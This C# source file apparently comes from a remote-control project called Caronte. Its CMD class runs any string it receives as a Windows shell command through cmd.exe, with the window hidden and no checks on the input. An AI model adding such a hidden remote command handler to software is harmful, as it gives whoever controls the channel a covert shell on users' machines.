﻿using Caronte.Domain.Enums;
using Caronte.Domain.Interfaces;
using Caronte.Domain.Models.Errors;
using Caronte.Domain.Responses;
using System;
using System.Collections.Generic;
using System.Diagnostics;

namespace Caronte.Modules.Command.ReceiveCommand.Commands
{
    public class CMD : IRemoteCommand
    {
        public object Execute(object parameter)
        {
            CommonResponse response = new();

            try
            {
                var processStartInfo = new ProcessStartInfo("cmd.exe", $"/C {Convert.ToString(parameter)}");

                processStartInfo.RedirectStandardOutput = true;
                processStartInfo.UseShellExecute = false;
                processStartInfo.CreateNoWindow = true;

                using (var processo = new Process())
                {
                    processo.StartInfo = processStartInfo;
                    processo.Start();
                }
            }
            catch (Exception ex)
            {
                response.AddErrors(new Error(ErrorTypeEnum.Unspecified, ex?.Message, new List<Exception>() { ex }));
            }

            return response;
        }
    }
}
